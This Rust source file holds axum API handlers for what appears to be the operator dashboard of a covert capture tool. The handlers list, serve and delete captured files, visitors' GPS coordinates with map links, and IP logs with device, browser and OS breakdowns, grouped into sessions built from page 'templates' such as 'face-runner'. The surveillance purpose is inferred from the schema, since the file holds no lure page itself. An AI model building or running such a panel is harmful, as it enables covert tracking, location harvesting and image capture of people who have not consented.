use crate::AppState;
use axum::extract::{Path, Query, State};
use axum::http::header;
use axum::http::StatusCode;
use axum::response::{IntoResponse, Response};
use axum::Json;
use serde::{Deserialize, Serialize};
use std::sync::Arc;

#[derive(Serialize)]
pub struct Stats {
    total_captures: i64,
    total_locations: i64,
    total_ips: i64,
    unique_ips: i64,
    total_size_bytes: i64,
    total_size_mb: f64,
    first_capture: Option<i64>,
    last_capture: Option<i64>,
}

#[derive(Serialize)]
pub struct CaptureRow {
    id: String,
    session_id: String,
    filename: String,
    file_type: String,
    file_size: i64,
    created_at: i64,
    url: String,
}

#[derive(Deserialize)]
pub struct CaptureQuery {
    #[serde(default = "default_page")]
    page: i64,
    #[serde(default = "default_per_page")]
    per_page: i64,
    search: Option<String>,
    sort: Option<String>,
}

fn default_page() -> i64 { 1 }
fn default_per_page() -> i64 { 60 }

#[derive(Serialize)]
pub struct PaginatedCaptures {
    captures: Vec<CaptureRow>,
    total: i64,
    page: i64,
    per_page: i64,
    pages: i64,
}

#[derive(Serialize)]
pub struct LocationRow {
    id: String,
    session_id: String,
    latitude: f64,
    longitude: f64,
    accuracy: Option<f64>,
    created_at: i64,
    maps_url: String,
}

#[derive(Serialize)]
pub struct IpRow {
    id: String,
    session_id: String,
    ip_address: String,
    user_agent: Option<String>,
    device: Option<String>,
    browser: Option<String>,
    os: Option<String>,
    created_at: i64,
}

#[derive(Serialize)]
pub struct IpStats {
    entries: Vec<IpRow>,
    total: i64,
    unique_ips: i64,
    device_breakdown: serde_json::Value,
    browser_breakdown: serde_json::Value,
    os_breakdown: serde_json::Value,
}

#[derive(Serialize)]
pub struct TemplateInfo {
    id: String,
    name: String,
    description: Option<String>,
    created_at: i64,
}

#[derive(Serialize)]
pub struct SessionInfo {
    id: String,
    name: String,
    template_id: String,
    status: String,
    created_at: i64,
}

#[derive(Deserialize)]
pub struct CreateSession {
    name: String,
    template_id: Option<String>,
}

pub async fn get_stats(State(state): State<Arc<AppState>>) -> Result<Json<Stats>, StatusCode> {
    let total_captures: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM captures")
        .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let total_locations: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM locations")
        .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let total_ips: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM ip_logs")
        .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let unique_ips: i64 = sqlx::query_scalar("SELECT COUNT(DISTINCT ip_address) FROM ip_logs")
        .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let total_size_bytes: i64 = sqlx::query_scalar("SELECT COALESCE(SUM(file_size),0) FROM captures")
        .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let (first_capture, last_capture): (Option<i64>, Option<i64>) =
        sqlx::query_as("SELECT MIN(created_at), MAX(created_at) FROM captures")
            .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    Ok(Json(Stats {
        total_captures, total_locations, total_ips, unique_ips,
        total_size_bytes, total_size_mb: (total_size_bytes as f64) / 1_048_576.0,
        first_capture, last_capture,
    }))
}

pub async fn list_captures(
    State(state): State<Arc<AppState>>,
    Query(q): Query<CaptureQuery>,
) -> Result<Json<PaginatedCaptures>, StatusCode> {
    let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM captures")
        .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let offset = (q.page - 1).max(0) * q.per_page;
    let order = match q.sort.as_deref() {
        Some("oldest") => "created_at ASC",
        Some("largest") => "file_size DESC",
        Some("smallest") => "file_size ASC",
        _ => "created_at DESC",
    };

    let rows: Vec<(String, String, String, String, i64, i64)> = sqlx::query_as(
        &format!("SELECT id, session_id, filename, file_type, file_size, created_at FROM captures ORDER BY {} LIMIT ? OFFSET ?", order)
    )
    .bind(q.per_page).bind(offset)
    .fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let captures: Vec<CaptureRow> = rows.into_iter().map(|(id, session_id, filename, file_type, file_size, created_at)| {
        let url = format!("/api/captures/{}/file", id);
        CaptureRow { id, session_id, filename, file_type, file_size, created_at, url }
    }).collect();

    let pages = if total > 0 { (total + q.per_page - 1) / q.per_page } else { 0 };

    Ok(Json(PaginatedCaptures { captures, total, page: q.page, per_page: q.per_page, pages }))
}

pub async fn get_capture(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    let row: Option<(String, String, String, String, i64, i64)> = sqlx::query_as(
        "SELECT id, session_id, filename, file_type, file_size, created_at FROM captures WHERE id = ?"
    ).bind(&id).fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    match row {
        Some((id, session_id, filename, file_type, file_size, created_at)) => {
            Ok(Json(serde_json::json!({
                "id": id, "session_id": session_id, "filename": filename,
                "file_type": file_type, "file_size": file_size, "created_at": created_at,
                "url": format!("/api/captures/{}/file", id)
            })))
        }
        None => Err(StatusCode::NOT_FOUND),
    }
}

pub async fn serve_capture_file(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> Result<Response, StatusCode> {
    let row: Option<(String, String)> = sqlx::query_as(
        "SELECT file_path, file_type FROM captures WHERE id = ?"
    ).bind(&id).fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    match row {
        Some((file_path, file_type)) => {
            let data = std::fs::read(&file_path).map_err(|_| StatusCode::NOT_FOUND)?;
            let mut resp = Response::new(data.into());
            resp.headers_mut().insert(header::CONTENT_TYPE, file_type.parse().unwrap());
            resp.headers_mut().insert(header::CACHE_CONTROL, "public, max-age=3600".parse().unwrap());
            Ok(resp)
        }
        None => Err(StatusCode::NOT_FOUND),
    }
}

pub async fn delete_capture(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> Result<StatusCode, StatusCode> {
    let row: Option<(String,)> = sqlx::query_as("SELECT file_path FROM captures WHERE id = ?")
        .bind(&id).fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    if let Some((file_path,)) = row {
        let _ = std::fs::remove_file(&file_path);
        sqlx::query("DELETE FROM captures WHERE id = ?").bind(&id)
            .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        Ok(StatusCode::NO_CONTENT)
    } else {
        Err(StatusCode::NOT_FOUND)
    }
}

pub async fn delete_all_captures(State(state): State<Arc<AppState>>) -> Result<StatusCode, StatusCode> {
    let rows: Vec<(String,)> = sqlx::query_as("SELECT file_path FROM captures")
        .fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    for (file_path,) in &rows { let _ = std::fs::remove_file(file_path); }
    sqlx::query("DELETE FROM captures").execute(&state.pool).await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Ok(StatusCode::NO_CONTENT)
}

pub async fn list_locations(State(state): State<Arc<AppState>>) -> Result<Json<Vec<LocationRow>>, StatusCode> {
    let rows: Vec<(String, String, f64, f64, Option<f64>, i64)> = sqlx::query_as(
        "SELECT id, session_id, latitude, longitude, accuracy, created_at FROM locations ORDER BY created_at DESC LIMIT 200"
    ).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let locations: Vec<LocationRow> = rows.into_iter().map(|(id, session_id, lat, lon, acc, created_at)| {
        let maps_url = format!("https://www.google.com/maps/place/{},{}", lat, lon);
        LocationRow { id, session_id, latitude: lat, longitude: lon, accuracy: acc, created_at, maps_url }
    }).collect();

    Ok(Json(locations))
}

pub async fn list_ips(State(state): State<Arc<AppState>>) -> Result<Json<IpStats>, StatusCode> {
    let rows: Vec<(String, String, String, Option<String>, Option<String>, Option<String>, Option<String>, i64)> =
        sqlx::query_as(
            "SELECT id, session_id, ip_address, user_agent, device, browser, os, created_at FROM ip_logs ORDER BY created_at DESC LIMIT 500"
        ).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let entries: Vec<IpRow> = rows.into_iter().map(|(id, session_id, ip_address, user_agent, device, browser, os, created_at)| {
        IpRow { id, session_id, ip_address, user_agent, device, browser, os, created_at }
    }).collect();

    let total = entries.len() as i64;
    let unique_ips: i64 = sqlx::query_scalar("SELECT COUNT(DISTINCT ip_address) FROM ip_logs")
        .fetch_one(&state.pool).await.unwrap_or(0);

    let device_breakdown = get_breakdown(&state.pool, "device").await;
    let browser_breakdown = get_breakdown(&state.pool, "browser").await;
    let os_breakdown = get_breakdown(&state.pool, "os").await;

    Ok(Json(IpStats { entries, total, unique_ips, device_breakdown, browser_breakdown, os_breakdown }))
}

async fn get_breakdown(pool: &sqlx::SqlitePool, col: &str) -> serde_json::Value {
    let query = format!("SELECT {}, COUNT(*) as cnt FROM ip_logs WHERE {} IS NOT NULL GROUP BY {} ORDER BY cnt DESC", col, col, col);
    let rows: Result<Vec<(Option<String>, i64)>, _> = sqlx::query_as(&query).fetch_all(pool).await;
    match rows {
        Ok(data) => serde_json::json!(data.into_iter().map(|(k, v)| (k.unwrap_or_default(), v)).collect::<std::collections::HashMap<_, _>>()),
        Err(_) => serde_json::json!({}),
    }
}

pub async fn list_templates(State(state): State<Arc<AppState>>) -> Result<Json<Vec<TemplateInfo>>, StatusCode> {
    let rows: Vec<(String, String, Option<String>, i64)> = sqlx::query_as(
        "SELECT id, name, description, created_at FROM templates ORDER BY name"
    ).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let templates: Vec<TemplateInfo> = rows.into_iter().map(|(id, name, description, created_at)| {
        TemplateInfo { id, name, description, created_at }
    }).collect();

    Ok(Json(templates))
}

#[derive(Serialize)]
pub struct EventRow {
    id: String,
    session_id: String,
    event_type: String,
    event_data: Option<serde_json::Value>,
    created_at: i64,
}

pub async fn list_events(
    State(state): State<Arc<AppState>>,
    Query(q): Query<EventQuery>,
) -> Result<Json<Vec<EventRow>>, StatusCode> {
    let session = q.session.unwrap_or_else(|| "default".into());
    let rows: Vec<(String, String, String, Option<String>, i64)> = sqlx::query_as(
        "SELECT id, session_id, event_type, event_data, created_at FROM events WHERE session_id = ? ORDER BY created_at ASC LIMIT 500"
    ).bind(&session).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let events: Vec<EventRow> = rows.into_iter().map(|(id, session_id, event_type, event_data, created_at)| {
        let parsed_data = event_data.and_then(|d| serde_json::from_str(&d).ok());
        EventRow { id, session_id, event_type, event_data: parsed_data, created_at }
    }).collect();

    Ok(Json(events))
}

#[derive(Deserialize)]
pub struct EventQuery {
    session: Option<String>,
}

pub async fn list_sessions(State(state): State<Arc<AppState>>) -> Result<Json<Vec<SessionInfo>>, StatusCode> {
    let rows: Vec<(String, String, String, String, i64)> = sqlx::query_as(
        "SELECT id, name, template_id, status, created_at FROM sessions ORDER BY created_at DESC"
    ).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let sessions: Vec<SessionInfo> = rows.into_iter().map(|(id, name, template_id, status, created_at)| {
        SessionInfo { id, name, template_id, status, created_at }
    }).collect();

    Ok(Json(sessions))
}

pub async fn create_session(
    State(state): State<Arc<AppState>>,
    Json(body): Json<CreateSession>,
) -> Result<Json<SessionInfo>, StatusCode> {
    let id = uuid::Uuid::new_v4().to_string();
    let template_id = body.template_id.unwrap_or_else(|| "face-runner".into());
    let now = chrono::Utc::now().timestamp();

    sqlx::query("INSERT INTO sessions (id, name, template_id, status, created_at) VALUES (?, ?, ?, 'active', ?)")
        .bind(&id).bind(&body.name).bind(&template_id).bind(now)
        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    Ok(Json(SessionInfo { id, name: body.name, template_id, status: "active".into(), created_at: now }))
}

pub async fn get_session(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> Result<Json<SessionInfo>, StatusCode> {
    let row: Option<(String, String, String, String, i64)> = sqlx::query_as(
        "SELECT id, name, template_id, status, created_at FROM sessions WHERE id = ?"
    ).bind(&id).fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    match row {
        Some((id, name, template_id, status, created_at)) => {
            Ok(Json(SessionInfo { id, name, template_id, status, created_at }))
        }
        None => Err(StatusCode::NOT_FOUND),
    }
}

pub async fn delete_session(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> Result<StatusCode, StatusCode> {
    if id == "default" { return Err(StatusCode::FORBIDDEN); }
    sqlx::query("DELETE FROM sessions WHERE id = ?").bind(&id)
        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Ok(StatusCode::NO_CONTENT)
}
